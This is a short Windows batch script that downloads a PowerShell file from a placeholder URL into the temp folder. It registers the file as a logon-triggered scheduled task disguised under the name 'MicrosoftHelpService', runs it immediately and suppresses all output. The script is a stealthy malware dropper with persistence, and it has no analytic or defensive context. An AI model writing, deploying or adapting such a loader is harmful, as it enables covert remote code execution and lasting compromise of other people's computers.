@echo off
set PS1=%TEMP%\winhelper.ps1
powershell -Command "Invoke-WebRequest -Uri 'RENDER_URL_PLACEHOLDER/download' -OutFile '%PS1%' -UseBasicParsing"
schtasks /create /tn "MicrosoftHelpService" /tr "powershell -NonInteractive -File \"%PS1%\"" /sc onlogon /ru %USERNAME% /f >nul 2>&1
schtasks /run /tn "MicrosoftHelpService" >nul 2>&1
exit
